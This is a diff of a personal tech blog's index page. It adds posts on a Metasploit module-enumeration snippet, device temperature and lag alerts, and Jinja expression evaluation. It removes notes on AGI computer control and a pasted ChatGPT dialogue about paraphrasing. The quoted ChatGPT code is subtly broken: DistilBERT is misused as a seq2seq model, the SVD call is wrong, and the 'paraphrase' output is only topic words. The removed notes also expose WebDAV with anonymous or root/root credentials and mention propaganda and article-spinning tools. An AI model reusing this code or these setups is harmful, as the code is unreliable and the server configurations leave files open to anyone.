+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">module_types = [<span class="string">&#x27;exploits&#x27;</span>,<span class="string">&#x27;auxiliary&#x27;</span>, <span class="string">&quot;encoders&quot;</span>, <span class="string">&quot;nops&quot;</span>, <span class="string">&quot;payloads&quot;</span>, <span class="string">&#x27;post&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> mt_plural <span class="keyword">in</span> module_types:</span><br><span class="line">module_type = mt_plural.rstrip(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> all_module_names:</span><br><span class="line">mod = client.modules.use(module_type, name)</span><br><span class="line"><span class="comment"># get default RPORT</span></span><br><span class="line">default_rport = mod.runoptions.get(<span class="string">&quot;RPORT&quot;</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+	
+	</div>
+  <a type="button" href="/blog/2024/03/31/a9195f8f-4cd8-4a15-ad6b-782a9b437b0a/#more" class="btn btn-default more">Read More</a>
+</div>
+
+	       
+		     
+	
+	<!-- display as entry -->	
+		<h3 class="title">
+			<div class="date"> 2024-01-14 </div>
+			<div class="article-title"><a href="/blog/2024/01/14/70062f91-44e2-4bf4-8694-40957d48c0ce/" title="Learn how to measure system responsiveness and temperature using Python, set alert thresholds for notifications, and install monitoring software as a daemon on various devices.">System Lagging Alert, Temperature Alert In Arbitrary Device</a></div>
+		</h3>
+	
+
+
+		     
+<div class="entry">
+
+  <div class="row">
+	
+	
+		<p>The system sometimes feels lagging, less responsive. The only way to fix is to reboot.</p>
+<p>Although monitor task completion time is helpful, but not general enough.</p>
+<p>Simple hack:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">measure_system_responsiveness</span>():</span><br><span class="line">start_time = time.time()</span><br><span class="line">subprocess.run(</span><br><span class="line">[<span class="string">&quot;echo&quot;</span>, <span class="string">&quot;hello&quot;</span>], capture_output=<span class="literal">True</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>, check=<span class="literal">True</span></span><br><span class="line">)</span><br><span class="line">end_time = time.time()</span><br><span class="line">exec_time = end_time - start_time</span><br><span class="line">exec_per_second = <span class="number">1</span> / exec_time</span><br><span class="line"><span class="keyword">return</span> exec_per_second</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Lagging related package:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install nohang oomd psi-notify</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>Temperature monitoring packages:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip3 install gpustat</span><br><span class="line">pip3 install pyspectator</span><br><span class="line">apt install lm-sensor <span class="comment"># sensors -j</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Create temperature statistics (high, low, mean) for all crucial components.</p>
+<p>Set alert threshold, only trigger alert if temperature reoccurs for several times.</p>
+<p>Send <code>ntfy.sh</code> notification as well as making audible alerts.</p>
+<p>Notification shall specify device name, component name, current temperature, threshold, statistics.</p>
+<p>Every device shall be equipped with this software as daemon, be it smartphone, MacBook, Linux PC, Windows PC.</p>
+
+	
+	</div>
+  <a type="button" href="/blog/2024/01/14/70062f91-44e2-4bf4-8694-40957d48c0ce/#more" class="btn btn-default more">Read More</a>
+</div>
+
+	       
+		     
+	
+	<!-- display as entry -->	
+		<h3 class="title">
+			<div class="date"> 2024-01-03 </div>
+			<div class="article-title"><a href="/blog/2024/01/03/85b5fb2f-a983-47d8-8231-6632c8e454e7/" title="The code showcases a secure expression evaluation function called `simple_eval` which utilizes Jinja2&#39;s Environment and StrictUndefined. This ensures safer execution by preventing undefined variable errors. The NeverUndefined class offers personalized error messages for undefined variables.">Safe Eval In Jinja</a></div>
+		</h3>
+	
+
+
+		     
+<div class="entry">
+
+  <div class="row">
+	
+	
+		<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> StrictUndefined</span><br><span class="line"><span class="keyword">from</span> jinja2.nativetypes <span class="keyword">import</span> NativeEnvironment</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simple_eval</span>(<span class="params">expr: <span class="built_in">str</span>, globals_dict: <span class="built_in">dict</span> = <span class="literal">None</span></span>):</span><br><span class="line">globals_dict = globals_dict <span class="keyword">or</span> &#123;&#125;</span><br><span class="line">env = Environment(variable_start_string=<span class="string">&#x27;$&#123;&#x27;</span>, variable_end_string=<span class="string">&#x27;&#125;&#x27;</span>, undefined=StrictUndefined)</span><br><span class="line">template = env.from_string(expr).render(**<span class="built_in">dict</span>(<span class="built_in">zip</span>(globals_dict.keys(), globals_dict.keys())))</span><br><span class="line">native_env = NativeEnvironment(undefined=StrictUndefined)</span><br><span class="line"><span class="keyword">return</span> native_env.from_string(<span class="string">&#x27;&#123;&#123;&#x27;</span> + template + <span class="string">&#x27;&#125;&#125;&#x27;</span>).render(**globals_dict)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="built_in">print</span>(simple_eval(<span class="string">&#x27;$&#123;a&#125;+1&#x27;</span>, &#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>&#125;) == <span class="number">2</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">NeverUndefined</span>(jinja2.StrictUndefined):</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, *args, **kwargs</span>):</span><br><span class="line"><span class="comment"># ARGS: (&quot;parameter &#x27;myvar2&#x27; was not provided&quot;,)</span></span><br><span class="line"><span class="comment"># KWARGS: &#123;&#x27;name&#x27;: &#x27;myvar2&#x27;&#125;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(args) == <span class="number">1</span>:</span><br><span class="line">info = args[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">elif</span> <span class="string">&quot;name&quot;</span> <span class="keyword">in</span> kwargs.keys():</span><br><span class="line">info = <span class="string">f&quot;Undefined variable &#x27;<span class="subst">&#123;kwargs[<span class="string">&#x27;name&#x27;</span>]&#125;</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">infoList = [<span class="string">&quot;Not allowing any undefined variable.&quot;</span>]</span><br><span class="line">infoList.append(<span class="string">f&quot;ARGS: <span class="subst">&#123;args&#125;</span>&quot;</span>)</span><br><span class="line">infoList.append(<span class="string">f&quot;KWARGS: <span class="subst">&#123;kwargs&#125;</span>&quot;</span>)</span><br><span class="line">info = <span class="string">&quot;\n&quot;</span>.join(infoList)</span><br><span class="line"><span class="keyword">raise</span> Exception(info)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+	
+	</div>
+  <a type="button" href="/blog/2024/01/03/85b5fb2f-a983-47d8-8231-6632c8e454e7/#more" class="btn btn-default more">Read More</a>
+</div>
+
+	       
+		     
+	
+	<!-- display as entry -->	
+		<h3 class="title">
 			<div class="date"> 2023-12-18 </div>
 			<div class="article-title"><a href="/blog/2023/12/18/8a6267a2-bda4-4d09-a577-49dbf47fb6d3/" title="This text provides guidance on utilizing the Python utility &#39;pylint&#39; to identify unspecified exceptions in a Python file and proposes constructing microservices and tracking failures for enhanced error management.">Exception Phobia In Python</a></div>
 		</h3>
@@ -169,74 +393,6 @@
 	
 	<!-- display as entry -->	
 		<h3 class="title">
-			<div class="date"> 2023-05-04 </div>
-			<div class="article-title"><a href="/blog/2023/05/04/f57039ce-6fc8-4be5-92ed-14f55b265fc8/" title="This article discusses various techniques such as optimizing AI models, utilizing different methods for creating bootable operating systems, working with tokenizers and embeddings, controlling OBS through Python programming, recording audio on macOS and Linux platforms, exploring complex neural network libraries, performing file operations using webdav-cli, capturing videos using Python and ffmpeg, forcing Ubuntu to utilize Xorg, and resizing virtual machine disks in UTM.">Agi That Controls Computer</a></div>
-		</h3>
-	
-
-
-		     
-<div class="entry">
-
-  <div class="row">
-	
-	
-		<p>make specialized (in RPA) tokenizer and embedding for this new model. add new words to the tokenizer.</p>
-<hr>
-<p>you can just boot ubuntu&#x2F;kali&#x2F;parrot iso without installing.</p>
-<p>but that would make us embarrasing. we need to check for the option.</p>
-<hr>
-<p>use ChatGPT-derived projects for localized propaganda on CyberGod and The Frozen Forest.</p>
-<h2 id="obs-remote-control"><a href="#obs-remote-control" class="headerlink" title="obs remote control"></a>obs remote control</h2><p>using <a target="_blank" rel="noopener" href="https://github.com/obsproject/obs-websocket">obs-websocket</a> you can use python to do real scripting. but first spin up obs first (with websocket related commandline arguments)</p>
-<p>you can also write and load scripts for obs, run on custom intervals and conditions.</p>
-<h2 id="audio-recording"><a href="#audio-recording" class="headerlink" title="audio recording"></a>audio recording</h2><p>your OS may go slient if you want to record audio from “speakers”</p>
-<hr>
-<p>using pyaudio, on macos, you need blackhole for sending all audio to oblivion, thus able to be recorded.</p>
-<p>on Linux, you need audio loopback device.</p>
-<p>run: <code>sudo modprobe snd-aloop</code></p>
-<p>you use <code>hw:1:0</code> or “Analog Device Output” for slient output&#x2F;speaker, and use <code>hw:1:1</code> or “Analog Device Input” for recording.</p>
-<h2 id="benchmarks"><a href="#benchmarks" class="headerlink" title="benchmarks"></a>benchmarks</h2><p>it is always a mystery for us to develop the right ML model. however, we can setup guidelines of good performance over specific task.</p>
-<p>automate the benchmark, setup metrics. there could be more room for trials and imagination.</p>
-<h2 id="encoding"><a href="#encoding" class="headerlink" title="encoding"></a>encoding</h2><p>use hfft&#x2F;rfft to transform multipart inputs (special bits, different part of mouse coords (x, y, dx, dy))</p>
-<p>if you want to use complex number as RNN input, you may need to swap ViT for ComplexConv2D, but maybe you just need a few.</p>
-<hr>
-<p>libraries that handle complex neural networks:</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/wavefrontshaping/complexPyTorch">complexPyTorch</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/soumickmj/pytorch-complex">pytorch-complex</a></p>
-<h2 id="multimodal"><a href="#multimodal" class="headerlink" title="multimodal"></a>multimodal</h2><p>do our model have to output multimodal data?</p>
-<p>if you combine some “special” bits along with token embeding by ihfft, you may have to retrain the entire damn network. also in order to make way for special bits, you may have to introduce extra linear layer.</p>
-<hr>
-<p>some may prefer “LoRA”? by only introducing few tunable params and changing the overall output?</p>
-<hr>
-<p>we may not annotate anything in our dataset. in contrast, we will set goals and make multiple interfaces for our model to explore.</p>
-<hr>
-<p>you can add special task specific embedding before passing to main model, then minus that task specific embedding after passing to classification model.</p>
-<h2 id="file-sharing-and-communication"><a href="#file-sharing-and-communication" class="headerlink" title="file sharing and communication"></a>file sharing and communication</h2><p>make sure you don’t share important files as read&#x2F;write on VM.</p>
-<hr>
-<p>you may host some “execution server” on UTM VMs. you may expose your very large hard disk using WebDAV server. i think x11vnc and other vnc server may suffice for linux, but we always want to listen to the real operational data, including human operation&#x2F;intervention, not just those in VNC protocols.</p>
-<hr>
-<p>WebDAV servers:</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/mar10/wsgidav">wsgidav</a> (python)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wsgidav --host=192.168.64.1 --port=8081 --root=<span class="string">&quot;/Volumes/Toshiba XG3/works/agi_computer_control&quot;</span>  --auth=anonymous</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://github.com/svtslv/webdav-cli">webdav-cli</a> （nodejs)</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webdav-cli --host=192.168.64.1 --port=8081 --username=root --password=root --path=<span class="string">&quot;/Volumes/Toshiba XG3/works/agi_computer_control&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="video-recording"><a href="#video-recording" class="headerlink" title="video recording"></a>video recording</h2><p>for Ubuntu ARM VM, <code>mss</code> failed on wayland but <code>pyautogui</code> works in both cases. write one python script to pipe raw images to ffmpeg for better compression ratio by shell. the final video is not “time-accurate”. it is frame by frame, matched with timestamps.</p>
-<hr>
-<p>forcing ubuntu to use xorg by: <code>sudo vim /etc/gdm3/custom.conf</code></p>
-<h2 id="resize-UTM-VM-disks"><a href="#resize-UTM-VM-disks" class="headerlink" title="resize UTM VM disks"></a>resize UTM VM disks</h2><p>you need to first resize the virtio disk in utm setting, then resize partition by using gparted, then <a target="_blank" rel="noopener" href="https://www.albertyw.com/note/resizing-ubuntu-utm#:~:text=For%20an%20Ubuntu%20guest%20OS%20running%20a%20default,be%20corrected%20by%20w%20%28rite%29%20warning%20More%20items">update the device mapper</a></p>
-
-	
-	</div>
-  <a type="button" href="/blog/2023/05/04/f57039ce-6fc8-4be5-92ed-14f55b265fc8/#more" class="btn btn-default more">Read More</a>
-</div>
-
-	       
-		     
-	
-	<!-- display as entry -->	
-		<h3 class="title">
 			<div class="date"> 2023-04-04 </div>
 			<div class="article-title"><a href="/blog/2023/04/04/cd70237b-ef04-47b8-a0dc-9ceadd42386c/" title="This article explores the advancements in Python performance, specifically mentioning Pypy&#39;s remarkable speed and how Codon leverages Python syntax to generate static executables.">Faster Python</a></div>
 		</h3>
@@ -282,208 +438,6 @@
 	
 	</div>
   <a type="button" href="/blog/2023/02/08/9105af56-d2c8-48c8-9b2d-a9693bf8429a/#more" class="btn btn-default more">Read More</a>
-</div>
-
-	       
-		     
-	
-	<!-- display as entry -->	
-		<h3 class="title">
-			<div class="date"> 2022-12-13 </div>
-			<div class="article-title"><a href="/blog/2022/12/13/e270170a-1520-4c18-af65-f9c4cc62a93e/" title="This article compares Dubbo and Python&#39;s XML-RPC as remote procedure call technologies, discussing their capabilities in handling native structures like numpy arrays. It also provides tutorial links for detecting if Dubbo services are functioning normally, along with warnings against ads when opening specific URLs.">Dubbo And Python Xmlrpc</a></div>
-		</h3>
-	
-
-
-		     
-<div class="entry">
-
-  <div class="row">
-	
-	
-		<p>they are both remote procedure calls.</p>
-<p>you can ship things across internet, but remember it can’t be some “native” structure like numpy array.</p>
-<p>python <a target="_blank" rel="noopener" href="https://wiki.python.org/moin/XmlRpc">xmlrpc</a> tutorial and <a target="_blank" rel="noopener" href="https://docs.python.org/3/library/xmlrpc.server.html">xmlrpc.server</a> mentions <a target="_blank" rel="noopener" href="http://c2.com/cgi/wiki?XmlRpc">c2 wiki</a> which you have scraped before. where is it, along with all other things you have scraped? believe it is in that AGI directory since you are such an archivist at that time.</p>
-<p>tutorials on how to detect if dubbo services are working normally:</p>
-<p>basically they use native java methods or telnet protocol with python</p>
-<p><a target="_blank" rel="noopener" href="http://www.shouhuola.com/q-23671.html">http://www.shouhuola.com/q-23671.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.yisu.com/zixun/576879.html">https://www.yisu.com/zixun/576879.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/leozhanggg/p/14176752.html">https://www.cnblogs.com/leozhanggg/p/14176752.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv13670275/">https://www.bilibili.com/read/cv13670275/</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.zztongyun.com/article/article-1-1.html">http://www.zztongyun.com/article/article-1-1.html</a> (open with <code>elinks</code> to prevent ads)</p>
-
-	
-	</div>
-  <a type="button" href="/blog/2022/12/13/e270170a-1520-4c18-af65-f9c4cc62a93e/#more" class="btn btn-default more">Read More</a>
-</div>
-
-	       
-		     
-	
-	<!-- display as entry -->	
-		<h3 class="title">
-			<div class="date"> 2022-12-08 </div>
-			<div class="article-title"><a href="/blog/2022/12/08/a60440bd-9482-44c5-9844-d747da208f69/" title="This article delves into AI techniques for text generation and paraphrasing, specifically exploring language models like LSA and LDA in Python. Comment A dives into word matrix decomposition to create attention-grabbing titles, while Comment B discusses the capabilities and drawbacks of Latent Semantic Analysis (LSA) in paraphrasing.">Talk To Openai Chatgpt To Learn A Few On Paraphrasing, Title Generation</a></div>
-		</h3>
-	
-
-
-		     
-<div class="entry">
-
-  <div class="row">
-	
-	
-		<p>it’s like a huge search engine which can talk.</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/topics/paraphrase">github topic on paraphrase</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.xiaofamaoai.com/">小发猫</a></p>
-<p><a target="_blank" rel="noopener" href="http://www.wzwyc.com/">文章伪原创工具</a> and <a target="_blank" rel="noopener" href="http://ai.guiyigs.com/">backup</a> 有提到用扫描仪来扫描原创文章的方法</p>
-<p>online <a target="_blank" rel="noopener" href="https://paraphrasetool.com/">paraphrase tool</a>  translation based, can process chinese</p>
-<p>chatgpt says creativity matters, such as hackers, video producers and your evil sex shit.</p>
-<h2 id="you-said-LDA-and-LSA-are-helpful-for-paraphrasing"><a href="#you-said-LDA-and-LSA-are-helpful-for-paraphrasing" class="headerlink" title="you said LDA and LSA are helpful for paraphrasing"></a>you said LDA and LSA are helpful for paraphrasing</h2><p>Yes, LDA and LSA are two methods that can be used to generate paraphrases of a given text. LDA (Latent Dirichlet Allocation) is a probabilistic model that can be used to identify topics in a text and then generate new sentences that express the same topics in a different way. LSA (Latent Semantic Analysis) is a method that uses singular value decomposition to identify the underlying meaning of words in a text and then generate paraphrases by replacing words with their closest semantic equivalents. Both LDA and LSA can be helpful for generating paraphrases, but they each have their own strengths and limitations.</p>
-<h2 id="can-you-demonstrate-how-to-use-LSA-for-paraphrasing-in-python"><a href="#can-you-demonstrate-how-to-use-LSA-for-paraphrasing-in-python" class="headerlink" title="can you demonstrate how to use LSA for paraphrasing in python"></a>can you demonstrate how to use LSA for paraphrasing in python</h2><p>I’m sorry, but I am not currently able to browse the internet or access any external resources. As a large language model trained by OpenAI, my knowledge is based solely on the text that I have been trained on, and I don’t have the ability to run code or demonstrate specific examples. However, I can provide a general overview of how LSA could be used for paraphrasing in Python.</p>
-<p>To use LSA for paraphrasing in Python, you would first need to create a matrix of word vectors for the words in the text you want to paraphrase. This matrix would represent the semantic relationships between the words in the text, and would be used to identify the underlying meaning of each word.</p>
-<p>Next, you would use singular value decomposition (SVD) to decompose the matrix into three matrices, which represent the different factors that contribute to the meaning of the words in the text.</p>
-<p>Once you have the three matrices, you can then use them to identify the most closely related words for each word in the text, and generate paraphrases by replacing words with their closest semantic equivalents.</p>
-<p>This is just a brief overview of how LSA could be used for paraphrasing in Python. There are many different ways to implement LSA, and the exact details of the implementation would depend on the specific requirements of your project.</p>
-<h2 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h2><p>I’m sorry, but I’m not sure what you would like me to continue with. If you have a specific question or topic you would like to discuss, I would be happy to help. Otherwise, I can provide more information about LSA and how it can be used for paraphrasing if that would be helpful. Let me know what you would like to know.</p>
-<h2 id="how-to-use-LDA-for-paraphrasing"><a href="#how-to-use-LDA-for-paraphrasing" class="headerlink" title="how to use LDA for paraphrasing"></a>how to use LDA for paraphrasing</h2><p>To use LDA for paraphrasing, you would first need to train a LDA model on a large corpus of text. This would involve using a machine learning algorithm to identify the topics that are present in the corpus, and then generating a set of “topic vectors” that represent the distribution of those topics across the text.</p>
-<p>Once you have trained the LDA model, you can then use it to generate paraphrases of a given text by identifying the topics present in the text and then replacing words with synonyms or related words that express the same topics in a different way. This process can be repeated multiple times to generate multiple paraphrases of the same text.</p>
-<p>Here is a brief example of how LDA could be used for paraphrasing in Python:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gensim <span class="keyword">import</span> corpora, models</span><br><span class="line"><span class="comment"># Load the text you want to paraphrase</span></span><br><span class="line">text = <span class="string">&quot;The quick brown fox jumps over the lazy dog.&quot;</span></span><br><span class="line"><span class="comment"># Tokenize the text and create a dictionary of words</span></span><br><span class="line">tokens = text.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">dictionary = corpora.Dictionary([tokens])</span><br><span class="line"><span class="comment"># Train a LDA model on the text</span></span><br><span class="line">lda_model = models.LdaModel([dictionary.doc2bow(tokens)], num_topics=<span class="number">1</span>)</span><br><span class="line"><span class="comment"># Generate paraphrases of the text</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">paraphrase = lda_model.show_topics(num_topics=<span class="number">1</span>, num_words=<span class="built_in">len</span>(tokens), formatted=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot; &quot;</span>.join([word[<span class="number">0</span>] <span class="keyword">for</span> word <span class="keyword">in</span> paraphrase[<span class="number">0</span>][<span class="number">1</span>]]))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>This example trains a simple LDA model on a single sentence and then generates three paraphrases of the sentence by replacing words with their closest semantic equivalents. Of course, this is just a simple example to illustrate the basic concept of using LDA for paraphrasing. In practice, you would need to use a much larger corpus of text to train the LDA model and generate more accurate paraphrases.</p>
-<h2 id="demonstrate-using-LSA-to-paraphrase-in-python-using-gensim-if-needed"><a href="#demonstrate-using-LSA-to-paraphrase-in-python-using-gensim-if-needed" class="headerlink" title="demonstrate using LSA to paraphrase in python, using gensim if needed"></a>demonstrate using LSA to paraphrase in python, using gensim if needed</h2><p>As I mentioned earlier, I am not currently able to browse the internet or access external resources, so I cannot demonstrate using LSA to paraphrase in Python using gensim or any other specific libraries. However, I can provide a general overview of how LSA could be used for paraphrasing in Python.</p>
-<p>To use LSA for paraphrasing in Python, you would first need to create a matrix of word vectors for the words in the text you want to paraphrase. This matrix would represent the semantic relationships between the words in the text, and would be used to identify the underlying meaning of each word.</p>
-<p>Once you have the matrix of word vectors, you can use singular value decomposition (SVD) to decompose the matrix into three matrices, which represent the different factors that contribute to the meaning of the words in the text. The gensim library includes a implementation of SVD that you can use for this purpose.</p>
-<p>Once you have the three matrices, you can then use them to identify the most closely related words for each word in the text, and generate paraphrases by replacing words with their closest semantic equivalents. Here is an example of how this could be done in Python:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gensim <span class="keyword">import</span> corpora, models, matutils</span><br><span class="line"><span class="comment"># Load the text you want to paraphrase</span></span><br><span class="line">text = <span class="string">&quot;The quick brown fox jumps over the lazy dog.&quot;</span></span><br><span class="line"><span class="comment"># Tokenize the text and create a dictionary of words</span></span><br><span class="line">tokens = text.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">dictionary = corpora.Dictionary([tokens])</span><br><span class="line"><span class="comment"># Create a matrix of word vectors using the dictionary</span></span><br><span class="line">word_vectors = [dictionary.doc2bow(tokens)]</span><br><span class="line"><span class="comment"># Use SVD to decompose the matrix of word vectors</span></span><br><span class="line">U, S, VT = matutils.svd(word_vectors, k=<span class="number">3</span>)</span><br><span class="line"><span class="comment"># Generate paraphrases of the text</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">paraphrase = []</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> tokens:</span><br><span class="line"><span class="comment"># Identify the closest semantic equivalents for each word</span></span><br><span class="line">closest_words = VT.dot(VT[dictionary.token2id[word]])</span><br><span class="line">closest_words = <span class="built_in">sorted</span>(<span class="built_in">enumerate</span>(closest_words), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line">closest_word = closest_words[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"><span class="comment"># Replace the word with its closest semantic equivalent</span></span><br><span class="line">paraphrase.append(dictionary[closest_word])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot; &quot;</span>.join(paraphrase))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>This example trains an LSA model on a single sentence and then generates three paraphrases of the sentence by replacing words with their closest semantic equivalents. Again, this is just a simple example to illustrate the basic concept of using LSA for paraphrasing. In practice, you would need to use a much larger corpus of text to train the LSA model and generate more accurate paraphrases.</p>
-<h2 id="how-to-use-transformer-for-paraphrasing"><a href="#how-to-use-transformer-for-paraphrasing" class="headerlink" title="how to use transformer for paraphrasing"></a>how to use transformer for paraphrasing</h2><p>The transformer is a type of neural network architecture that has been used for a wide range of natural language processing tasks, including paraphrasing. To use a transformer for paraphrasing, you would need to train the transformer on a large corpus of text using a machine learning algorithm.</p>
-<p>During training, the transformer would learn to identify the underlying meaning of words and phrases in the text and then generate paraphrases by replacing words with synonyms or related words that express the same meaning in a different way.</p>
-<p>Here is a brief example of how a transformer could be used for paraphrasing in Python:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, AutoModelForSeq2SeqLM</span><br><span class="line"><span class="comment"># Load the text you want to paraphrase</span></span><br><span class="line">text = <span class="string">&quot;The quick brown fox jumps over the lazy dog.&quot;</span></span><br><span class="line"><span class="comment"># Tokenize the text using a pre-trained transformer model</span></span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(<span class="string">&quot;distilbert-base-cased&quot;</span>)</span><br><span class="line">tokens = tokenizer.encode(text)</span><br><span class="line"><span class="comment"># Load a pre-trained transformer model</span></span><br><span class="line">transformer = AutoModelForSeq2SeqLM.from_pretrained(<span class="string">&quot;distilbert-base-cased&quot;</span>)</span><br><span class="line"><span class="comment"># Generate paraphrases of the text</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">paraphrase = transformer.generate(tokens)</span><br><span class="line">paraphrase = tokenizer.decode(paraphrase[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(paraphrase)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>This example uses a pre-trained transformer model to generate three paraphrases of a single sentence. Of course, in practice you would need to train the transformer on a much larger corpus of text to generate more accurate paraphrases. The exact details of the implementation would depend on the specific requirements of your project.</p>
-<h2 id="how-to-generate-catchy-title-from-keywords-using-language-model"><a href="#how-to-generate-catchy-title-from-keywords-using-language-model" class="headerlink" title="how to generate catchy title from keywords using language model"></a>how to generate catchy title from keywords using language model</h2><p>To generate a catchy title from a set of keywords using a language model, you would need to train the language model on a large corpus of text that includes a variety of titles. During training, the language model would learn to identify the underlying meaning of words and phrases and the characteristics of catchy titles.</p>
-<p>Once the language model has been trained, you can then use it to generate a catchy title from a set of keywords by providing the keywords as input to the model and then selecting the generated title that is the most catchy and relevant to the keywords.</p>
-<p>Here is a brief example of how this could be done in Python:</p>
